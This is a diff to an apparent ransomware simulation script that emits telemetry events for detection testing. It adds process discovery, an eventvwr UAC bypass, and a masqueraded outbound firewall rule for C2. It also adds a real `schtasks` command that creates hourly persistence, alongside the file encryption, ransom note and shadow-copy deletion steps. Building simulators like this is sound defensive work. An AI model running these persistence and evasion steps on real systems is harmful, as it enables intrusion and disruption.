@@ -26,6 +26,7 @@ from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from naming_helper import phase_delay
+from defense_helper import emit_uac_bypass, emit_firewall_rule, emit_process_discovery
 
 
 # =============================================================================
@@ -125,7 +126,15 @@ def main() -> int:
     key = hashlib.sha256(b"NyxTrace-Simulation-Key-2024").digest()
     cipher = AES256(key)
 
-    # --- Phase 1: Create target files ---
+    # --- Phase 1: Process Discovery ---
+    emit_process_discovery("ransomware.exe")
+    time.sleep(phase_delay("process_discovery"))
+
+    # --- Phase 2: UAC bypass ---
+    emit_uac_bypass("ransomware.exe", "eventvwr")
+    time.sleep(phase_delay("uac_bypass"))
+
+    # --- Phase 3: Create target files ---
     set_phase("target_creation")
     emit("PROCESS", "CREATE_THREAD", "ransomware.exe", "INFO",
          source_process="ransomware.exe", detail="Creating target documents")
@@ -141,7 +150,7 @@ def main() -> int:
         emit("FILE", "CREATE_FILE", str(path), "INFO", source_process="ransomware.exe", size=len(content))
         time.sleep(phase_delay("file_create"))
 
-    # --- Phase 2: Encrypt files ---
+    # --- Phase 4: Encrypt files ---
     set_phase("encryption")
     emit("PROCESS", "CREATE_THREAD", "ransomware.exe", "CRITICAL",
          source_process="ransomware.exe", detail="Beginning file encryption", technique_id="T1486")
@@ -162,7 +171,7 @@ def main() -> int:
             emit("FILE", "WRITE_FILE", str(path), "WARNING", source_process="ransomware.exe", error=str(e))
         time.sleep(phase_delay("file_encrypt"))
 
-    # --- Phase 3: Shadow copy deletion ---
+    # --- Phase 5: Shadow copy deletion ---
     if env != EnvSafety.SUSPICIOUS:
         set_phase("anti_recovery")
         emit("PROCESS", "CREATE_PROCESS", "vssadmin.exe", "CRITICAL",
@@ -177,7 +186,7 @@ def main() -> int:
         emit("REGISTRY", "DELETE_SHADOWS", r"HKLM\SYSTEM\CurrentControlSet\Services\VSS", "CRITICAL",
              source_process="ransomware.exe", detail="Volume Shadow Copy deletion attempted")
 
-    # --- Phase 4: Ransom note ---
+    # --- Phase 6: Ransom note ---
     set_phase("ransom_demand")
     note_path = desktop / "DECRYPT_YOUR_FILES.html"
     note_path.write_text(f"""<!DOCTYPE html>
@@ -193,7 +202,7 @@ Key: NyxTrace-Simulation-Key-2024</p></body></html>""", encoding="utf-8")
     emit("FILE", "RANSOM_NOTE", str(note_path), "CRITICAL",
          source_process="ransomware.exe", detail="Ransom note dropped", type="html")
 
-    # --- Phase 5: Wallpaper change ---
+    # --- Phase 7: Wallpaper change ---
     if env != EnvSafety.SUSPICIOUS:
         set_phase("defacement")
         emit("REGISTRY", "WALLPAPER", r"HKCU\Control Panel\Desktop", "WARNING",
@@ -206,13 +215,32 @@ Key: NyxTrace-Simulation-Key-2024</p></body></html>""", encoding="utf-8")
         except Exception:
             pass
 
-    # --- Phase 6: Persistence ---
+    # --- Phase 8: Persistence via Run Key ---
     set_phase("persistence")
     run_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
     emit("REGISTRY", "SET_VALUE", run_key, "CRITICAL",
          source_process="ransomware.exe",
          value_name="CryptoService", value_data=r"C:\ProgramData\svchost_crypto.exe",
          detail="Persistence mechanism installed", technique_id="T1547.001")
+
+    # --- Phase 9: Scheduled Task Persistence ---
+    set_phase("scheduled_task")
+    emit("PROCESS", "SCHEDULED_TASK", "schtasks.exe", "CRITICAL",
+         source_process="ransomware.exe",
+         detail="Creating scheduled task for persistence", technique_id="T1053.005")
+    try:
+        subprocess.run([
+            "schtasks", "/create", "/tn", "CryptoRecovery",
+            "/tr", r"C:\ProgramData\svchost_crypto.exe",
+            "/sc", "HOURLY", "/f"
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("scheduled_task"))
+
+    # --- Phase 10: Firewall Rule for C2 ---
+    emit_firewall_rule("ransomware.exe", "Windows Update Service", "out", 443)
+    time.sleep(phase_delay("firewall_rule"))
 
     emit("PROCESS", "EXIT_PROCESS", "ransomware.exe", "INFO",
          source_process="ransomware.exe", files_encrypted=encrypted_count, total_targets=len(targets))
